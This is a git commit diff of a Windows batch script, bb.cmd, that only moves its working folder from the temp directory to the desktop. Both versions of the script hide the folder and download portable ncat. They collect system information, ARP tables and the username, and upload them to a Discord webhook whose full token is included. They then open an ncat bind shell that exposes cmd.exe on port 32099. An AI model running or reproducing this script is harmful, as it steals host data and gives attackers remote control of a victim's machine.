652e58d0b88765a1d050f628fd31f5b8205d28b0
lsecanon <sherapsy@gmail.com>
2025-03-15 11:40:09 -0700

    Update bb.cmd

--- bb.cmd
+++ bb.cmd
@@ -1,10 +1,10 @@
-mkdir %temp%\bb
-attrib +s +h +i +x %temp%\bb
-curl -o -l https://github.com/l-urk/netcat/blob/main/ncat-portable-5.59BETA1.zip %temp%\bb\ncat-portable-5.59BETA1.zip
-tar -xf %temp%\bb\ncat-portable-5.59BETA1.zip
-echo systeminfo >> %temp%\bb\systeminfo.txt
-echo arp -a >> %temp%\bb\arp.txt
+mkdir %userprofile%\desktop\bb
+attrib +s +h +i +x %userprofile%\desktop\bb
+curl -o -l https://github.com/l-urk/netcat/blob/main/ncat-portable-5.59BETA1.zip %userprofile%\desktop\bb\ncat-portable-5.59BETA1.zip
+tar -xf %userprofile%\desktop\bb\ncat-portable-5.59BETA1.zip
+echo systeminfo >> %userprofile%\desktop\bb\systeminfo.txt
+echo arp -a >> %userprofile%\desktop\bb\arp.txt
 for /f "delims=" %n in ('whoami') do set name=%n
-curl -F "content=%name%" -F "file=@%temp%\bb\systeminfo.txt" https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
-curl -F "content=%name%" -F "file=@%temp%\bb\arp.txt"        https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
-%temp%\bb\ncat-portable-5.59BETA1\ncat.exe -lvp 32099 -e cmd.exe
+curl -F "content=%name%" -F "file=@%userprofile%\desktop\bb\systeminfo.txt" https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
+curl -F "content=%name%" -F "file=@%userprofile%\desktop\bb\arp.txt"        https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
+%userprofile%\desktop\bb\ncat-portable-5.59BETA1\ncat.exe -lvp 32099 -e cmd.exe
